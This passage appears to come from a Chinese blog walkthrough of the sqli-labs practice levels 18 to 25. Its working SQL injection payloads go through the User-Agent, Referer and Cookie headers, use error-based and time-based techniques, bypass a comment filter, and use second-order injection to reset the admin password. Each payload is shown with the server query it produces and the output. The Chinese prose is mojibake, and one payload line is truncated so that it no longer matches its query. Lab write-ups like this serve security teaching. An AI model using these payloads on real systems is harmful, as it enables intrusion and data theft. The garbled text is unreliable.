class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">&gt;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or updatexml(1,concat(0x7e,(database()),0x7e),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">&gt;XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or c, &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2ã€æ—¶é—´ç›²æ³¨ï¼Œä»…å±•ç¤ºåº“åé•¿åº¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">æ…¢äº†ä¸‰ç§’</span><br></pre></td></tr></table></figure><h3 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h3><p><strong>è¯·æ±‚å¤´ï¼ˆRefererï¼‰-æ³¨å…¥-æŠ¥é”™&#x2F;æ—¶é—´æ³¨å…¥</strong><br>æŸ¥çœ‹åç«¯ä»£ç ï¼Œç±»ä¼¼level-18ï¼Œåªä¸è¿‡æ¢äº†å˜é‡<br>ä»…å±•ç¤ºextractvalueï¼Œå…¶ä½™ä¸€æ ·ï¼Œå³<code>Referer: a&#39;or PAYLOAD, &#39;123&#39;)#</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">Referer: a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;</span>a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>)</span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h3><p><strong>è¯·æ±‚å¤´ï¼ˆcookieï¼‰-ç®€å•è·³è½¬-æ³¨å…¥</strong><br>è¿™é‡Œç›´æ¥burpæŠ“åŒ…ï¼Œå‘ç°ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡ä¸ºPOSTï¼Œç¬¬äºŒæ¬¡ä¸ºGET<br><img src="/2022/02/17/sqli-labs/2022-02-21-23-05-39.png"><br>é‡å¤ç¬¬ä¸€æ¬¡POSTå¹¶ä¸èƒ½è·å¾—æœ‰æ•ˆä»·å€¼å›æ˜¾ï¼Œç¬¬äºŒæ¬¡GETæ‰æœ‰<br>æŸ¥çœ‹åç«¯ä»£ç ï¼Œå¾—åˆ°å…³é”®ä»£ç ï¼Œç¬¬ä¸€æ¬¡ç™»é™†è®¾ç½®cookieï¼Œåé¢GETè¯·æ±‚åªéœ€è¦cookieï¼Œå¹¶è®¾ç½®cookieå¯¿å‘½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]))<span class="comment">#ä¸ºçœŸåˆ™è®¾ç½®cookieï¼Œä¸ºå‡ç›´æ¥è¿›å…¥æ˜¾ç¤ºç•Œé¢</span></span><br><span class="line">    &#123;</span><br><span class="line">    ---</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);<span class="comment">#è®¾ç½®cookie</span></span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);<span class="comment">#è·³è½¬ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿™é‡ŒPOSTå˜æˆäº†GET</span></span><br><span class="line">    ---</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ---</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#åˆ©ç”¨è¯­å¥</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    ---</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯åˆ©ç”¨ç‚¹åœ¨äºä¼ªé€ GETè¯·æ±‚çš„cookie,ä»ä¸Šé¢åˆ©ç”¨è¯­å¥å¯ä»¥çœ‹å‡ºå¾ˆç®€å•<br>ä»…æµ‹è¯•åº“å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">çˆ†å­—æ®µæ•°</span><br><span class="line">    Cookie: uname=admin<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">    åç«¯æ‹¼æ¥å</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; order by 3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    å›æ˜¾æ­£å¸¸</span><br><span class="line">    å¾—å­—æ®µæ•°ä¸º<span class="number">3</span></span><br><span class="line">çˆ†åº“å</span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">    åç«¯æ‹¼æ¥å</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>-admin<span class="string">&#x27; union select 1,2,3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    å›æ˜¾</span><br><span class="line">    Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span> Your ID:<span class="number">1</span> //<span class="number">1</span>ï¼Œ<span class="number">2</span>ï¼Œ<span class="number">3</span>éƒ½å¯ä»¥åˆ©ç”¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,database()#</span></span><br><span class="line"><span class="string">    å›æ˜¾</span></span><br><span class="line"><span class="string">    Your Password:security</span></span><br></pre></td></tr></table></figure><h3 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h3><p><strong>è¯·æ±‚å¤´ï¼ˆcookieï¼‰-ç®€å•è·³è½¬base64-å•å¼•å·-å•æ‹¬å·-æ³¨å…¥</strong><br>åŸç†ç±»ä¼¼äºlevel-20ï¼Œä¸è¿‡åŠ äº†å•å¼•å·å•æ‹¬å·ï¼Œè™½ç„¶cookieå­˜å‚¨æ—¶ base64åŠ å¯†äº†ï¼Œä½†æ˜¯sqlæŸ¥è¯¢æ—¶åˆè§£äº†<br>æŸ¥çœ‹æ­£å¸¸åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli-labs/Less-<span class="number">21</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/sqli-labs/Less-<span class="number">21</span>/</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: uname=YWRtaW4%3D è¿™é‡Œbase64åŠ å¯†äº†</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç è¿˜æ˜¯å·®ä¸å¤šï¼Œæˆ‘åªéœ€è¦æŠŠcookieå¯¹åº”åŠ å¯†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>ç›´æ¥æµ‹è¯•åº“åï¼Œå‰åéƒ½ä¸å±•å¼€äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åŸè¯­å¥</span><br><span class="line">-admin<span class="string">&#x27;) union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#</span></span><br><span class="line">æ‹¼æ¥å</span><br><span class="line">SELECT * FROM users WHERE username=(<span class="string">&#x27;=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#&#x27;)</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-22"><a href="#level-22" class="headerlink" title="level-22"></a>level-22</h3><p><strong>è¯·æ±‚å¤´ï¼ˆcookieï¼‰-ç®€å•è·³è½¬base64-åŒå¼•å·-æ³¨å…¥</strong><br>ä»£ç åŸºæœ¬æ²¡å˜ï¼Œåªæ˜¯å†è§£å¯†åï¼ŒåŠ äº†åŒå¼•å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æµ‹è¯•åº“åï¼Œå‰åéƒ½ä¸å±•å¼€äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åŸè¯­å¥</span><br><span class="line">uname=-admin<span class="string">&quot; union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span></span><br><span class="line"><span class="string">æ‹¼æ¥å</span></span><br><span class="line"><span class="string">&gt;SELECT * FROM users WHERE username=&quot;</span>-admin<span class="string">&quot; union select 1,2,database()#&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong><br><a href="https://www.cnblogs.com/du892294464/p/6835277.html">phpä¸­å®ç°é¡µé¢è·³è½¬çš„å‡ ç§æ–¹å¼</a></p><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><h3 id="level-23"><a href="#level-23" class="headerlink" title="level-23"></a>level-23</h3><p><strong>å­—æ®µå›æ˜¾-è¿‡æ»¤ï¼ˆæ³¨é‡Šè¿‡æ»¤ï¼‰-ç®€å•&#x2F;æŠ¥é”™æ³¨å…¥</strong><br>ç®€å•è¾“å…¥,åˆ¤æ–­å•å¼•å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>åç«¯å…³é”®ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¿‡æ»¤ <span class="comment"># --</span></span><br><span class="line">    $reg = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line">    $reg1 = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line">    $replace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg, $replace, $<span class="built_in">id</span>);</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg1, $replace, $<span class="built_in">id</span>);</span><br><span class="line">æŸ¥è¯¢è¯­å¥</span><br><span class="line">    $sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å°±æ˜¯æ¢ä¸ªæ–¹å¼è¾¾åˆ°æ³¨é‡Šå¾—ç›®çš„ï¼Œæˆ–è€…è®©è¯­å¥æ¢ç§æ–¹å¼é—­åˆå¯æ‰§è¡Œ</p><p>1ã€<code>;%00</code>éš”æ–­<br>ç±»ä¼¼äº%23&#x3D;#ï¼Œ%00åœ¨åç«¯è¢«è½¬ä¹‰åæ˜¯ä¸ªç©ºç™½ç¬¦ï¼Œç»“åˆåˆ†å· â€˜<code>;</code>â€™ sqlè¯­å¥è¯»åˆ°è¿™é‡Œå°±è®¤åé¢æ²¡æœ‰äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or 1 ;%00</span></span><br><span class="line"><span class="string">åç«¯å¤„ç†å</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; or 1;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> è¿™é‡Œâ€˜;â€™åé¢æ˜¯æœ‰ä¸€ä¸ªacsiiä¸º<span class="number">0x00</span>çš„å­—ç¬¦ï¼Œå‘æŒ¥éš”æ–­çš„ä½œç”¨</span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µæ•°</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 4  ;%00</span></span><br><span class="line"><span class="string">çˆ†åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-23/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database() ;%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>2ã€é—­åˆè¯­å¥ï¼Œåˆ©ç”¨æŠ¥é”™<br>å‰é¢è¯´è¿‡ï¼ŒæŠ¥é”™è¯­å¥æ”¾åœ¨å‚æ•°ä½ï¼Œè¿™é‡Œåªä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">floor</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span></span><br><span class="line">    åç«¯å¤„ç†å</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>,floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    å›æ˜¾</span><br><span class="line">    Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line">updatexml</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">    åç«¯å¤„ç†å</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    å›æ˜¾</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line">extractvalue </span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or extractvalue(1, concat(0x7e,(database()),0x7e))  or &#x27;</span></span><br><span class="line">    åç«¯å¤„ç†å</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>)) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    å›æ˜¾</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å•çº¯åˆ©ç”¨é—­åˆï¼Œè¿™é‡Œéƒ½å¯ä»¥å‘æŒ¥è‡ªå·±çš„æƒ³è±¡åŠ›äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  union select 1,database(),3 or &#x27;</span></span><br><span class="line">åç«¯å¤„ç†å</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> union select <span class="number">1</span>,database(),<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">    Your Login name:security</span><br><span class="line">    Your Password:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-24"><a href="#level-24" class="headerlink" title="level-24"></a>level-24</h3><p><strong>æœªæ£€éªŒç”¨æˆ·å-ç®€å•äºŒæ¬¡æ³¨å…¥</strong><br>æ¼æ´é€»è¾‘æ˜¯ç™»å½•&#x2F;æ³¨å†Œéƒ½è½¬ä¹‰äº†ï¼Œä½†æ˜¯åœ¨æ›´æ”¹å¯†ç æ—¶æ²¡æœ‰ã€‚<br>pass_change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];<span class="comment">#æœªè½¬ä¹‰ï¼Œé€ æˆæ¼æ´</span></span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å°±ä½¿ç”¨<code>username</code>æ³¨å…¥<br>è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä¹‹å‰è¯´è¿‡ï¼Œæ”¾åœ¨å‚æ•°ä¸ºå³å¯<br>å¦‚æœæˆ‘ä»¬æƒ³ä¿®æ”¹<code>admin</code>çš„å¯†ç <br>æ–°å»ºç”¨æˆ· <code>admin&#39;#</code> å¯†ç <code>123 </code><br>ç„¶åæ›´æ”¹<code>admin&#39;#</code> çš„å¯†ç  ä¸º345ï¼Œåç«¯ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬æŠŠ<code>admin</code>çš„å¯†ç æ”¹æˆäº†<code>345</code>,ä¹Ÿå°±æ˜¯å¯ä»¥åˆ©ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;345&#x27;</span> where username=<span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‹¼æ¥æˆå…¶ä»–çš„sqlè¯­å¥ï¼Œä½†æ˜¯åç«¯usernameé™åˆ¶é•¿åº¦20ï¼Œå‘æŒ¥ç©ºé—´ä¹Ÿä¸æ˜¯å¾ˆå¤§</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level-25"></a>level-25</h3><p><strong>è¿‡æ»¤or&#x2F;and-å•å¼•å·-ç®€å•æ³¨å…¥</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 